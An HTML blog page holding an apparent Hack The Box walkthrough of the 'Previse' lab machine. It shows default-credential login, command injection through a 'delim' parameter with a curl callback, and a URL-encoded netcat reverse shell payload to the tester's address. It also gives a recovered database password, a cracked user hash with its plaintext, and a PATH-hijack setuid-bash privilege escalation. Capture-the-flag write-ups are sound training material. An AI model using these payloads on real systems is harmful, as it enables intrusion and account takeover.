<!doctype html>
<html lang="en-us">
  <head>
    <title>Previse - HTB // FoushGX</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.80.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="Muhammed Foaad" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://foushgx.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Previse - HTB"/>
<meta name="twitter:description" content="Hello everyone,Today i&rsquo;ll show you how i pwned Previse Machine.   Recon Steps first of all after we got the ip we made a port scanning to know which ports are open&hellip; nmap -sV -sC IP  -&gt;   okey we have only 2 ports 22,80..
let&rsquo;s check port 80 first.. first thing we found was a login page so i tried defaults Cred. admin:admin ooooh, it works and we logged as admin."/>

    <meta property="og:title" content="Previse - HTB" />
<meta property="og:description" content="Hello everyone,Today i&rsquo;ll show you how i pwned Previse Machine.   Recon Steps first of all after we got the ip we made a port scanning to know which ports are open&hellip; nmap -sV -sC IP  -&gt;   okey we have only 2 ports 22,80..
let&rsquo;s check port 80 first.. first thing we found was a login page so i tried defaults Cred. admin:admin ooooh, it works and we logged as admin." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://foushgx.github.io/htb/previse/" />
<meta property="article:published_time" content="2022-01-08T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-01-08T00:00:00+00:00" />


  </head>
  <body>
    <header class="app-header">
      <a href="https://foushgx.github.io/"><img class="app-header-avatar" src="/Profile.jpg" alt="Muhammed Foaad" /></a>
      <h1>FoushGX</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             <br> 
          
          <a class="app-header-menu-item" href="/about/">about</a>
             <br> 
          
          <a class="app-header-menu-item" href="/htb/">Hack The Box</a>
             <br> 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Jr.Penetration Tester | CTF Player</p>
      <div class="app-header-social">
        
          <a href="https://facebook.com/foushgx" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
  <title>Facebook</title>
  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
</svg>
          </a>
        
          <a href="https://www.linkedin.com/in/foushgx" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>LinkedIn</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
          <a href="https://twitter.com/foushgx" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
          <a href="https://github.com/foushgx" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Previse - HTB</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jan 8, 2022
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          3 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://foushgx.github.io/tags/htb-easy/">HTB-Easy</a>
              <a class="tag" href="https://foushgx.github.io/tags/walkthrough/">Walkthrough</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h3 id="hello-everyonetoday-ill-show-you-how-i-pwned--previse-machine">Hello everyone,Today i&rsquo;ll show you how i pwned  <code>Previse</code> Machine.</h3>
<figure>
    <img src="/Images/previse/pwned.png"/> 
</figure>

<h3 id="recon-steps">Recon Steps</h3>
<p>first of all after we got the ip we made a port scanning to know which ports are open&hellip;
<code>nmap -sV -sC IP </code> -&gt; <figure>
    <img src="/Images/previse/nmap.png"/> 
</figure>

okey we have only 2 ports 22,80..</p>
<p>let&rsquo;s check port 80 first..
first thing we found was a login page so i tried defaults Cred. <code>admin:admin</code>
ooooh, it works and we logged as admin.
after i loggedin i decided to recon in site firstly..
<figure>
    <img src="/Images/previse/site-recon.png"/> 
</figure>

so, what i found was a <code>sitebackup.zip</code> and we all already know what that mean xD &hellip; source code for site.
I downloaded it and start check some files like <code>config.php</code> and got that -&gt;
<figure>
    <img src="/Images/previse/config.png"/> 
</figure>

then checked some files and the important one was <code>logs.php</code> -&gt;
<figure>
    <img src="/Images/previse/logs.png"/> 
</figure>

here i found that in php file it uses <code>exec</code> to run another script in system and didn&rsquo;t even validate input.
** we can access this function from request to <code>/file_logs.php</code> and choose any delim then intercept request with Burp.</p>
<p>so, created my payload to check for RCE <code>nc -nlvp 1234</code>  then from the burp send request a file from my system.
<code>delim=comma%26curl+http://10.10.16.3:1234</code> and good it&rsquo;s accepted <code>200 OK</code></p>
<h3 id="access-m4lwhere-user">Access [m4lwhere] user</h3>
<ul>
<li>so i make my payload to get revshell -&gt; <code>comma%26rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7Cbash%20-i%202&gt;%261%7Cnc%2010.10.16.3%204444%20&gt;/tmp/f</code>
OK we have a revshell as <code>www-data</code> , as we found before in <code>config.php</code> i go to run mysql to check databases.
<code>echo &quot;mySQL_p@ssw0rd!:)&quot; | mysql -u root -p </code> and started to interact with database <figure>
    <img src="/Images/previse/mysql.png"/> 
</figure>

so we have <code>m4lwhere</code> password hash now. <code>$1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.</code>
using hashcat or john
<code>hashcat -a 0 -m 500 hash /usr/share/wordlists/rockyou.txt</code> ,
<code>john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash </code>
we got password <code>ilovecody112235!</code> we can now connect to ssh with this user Cred.</li>
</ul>
<h3 id="privilege-escalation">privilege Escalation</h3>
<ul>
<li>for privEsc we Run <code>sudo -l</code> and put the password. <figure>
    <img src="/Images/previse/m4lwhere.png"/> 
</figure>

we got this script we can run as root. but we cannot edit it</li>
<li>if we read script carfully we can se that it uses <code>date</code> command so we can overrite this command with our code.</li>
</ul>
<pre><code>bash-4.4$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; date
bash-4.4$ chmod 777 date
bash-4.4$ export PATH=/tmp:$PATH
bash-4.4$ sudo /opt/scripts/access_backup.sh 
</code></pre><ol>
<li>first line we make a copy from <code>/bin/bash</code> and change it&rsquo;s perm then we add it to file called <code>date</code>.</li>
<li>second line we change prem to file to make it executable by anyone.</li>
<li>third line we add the path of file at begging of <code>PATH</code>
so when we run script first <code>date</code> will run will execute our file not main command.</li>
<li>we run main privilege file as sudo and wait for it.</li>
</ol>
<p>Last step is to check for file that we copied
<figure>
    <img src="/Images/previse/root.png"/> 
</figure>
</p>
<p>Congrats!!! you are root now&hellip;.</p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
